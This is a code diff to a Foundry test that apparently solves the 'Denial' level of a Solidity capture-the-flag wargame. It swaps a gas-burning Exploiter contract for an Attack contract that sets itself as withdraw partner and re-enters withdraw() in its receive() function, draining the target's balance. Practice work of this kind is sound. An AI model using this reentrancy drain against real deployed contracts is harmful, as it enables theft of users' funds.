@@ -38,26 +38,22 @@ contract TestDenial is BaseTest {
         vm.startPrank(player, player);
 
         // Solve the Challenge
+        new Attack(levelAddress);
    
         vm.stopPrank();
     }
 }
 
-contract Exploiter {
-    uint256 private sum;
-
-    function withdraw(Denial victim) external {
-        victim.withdraw();
-    }
-
-    function exploit() public {
-        uint256 index;
-        for (index = 0; index < uint256(-1); index++) {
-            sum += 1;
-        }
+contract Attack {
+    Denial private level;
+    constructor(address payable _target) public payable {
+        level = Denial(_target);
+        level.setWithdrawPartner(address(this));
     }
 
     receive() external payable {
-        exploit();
+        while (address(level).balance > 99) {
+            level.withdraw();
+        }
     }
 }
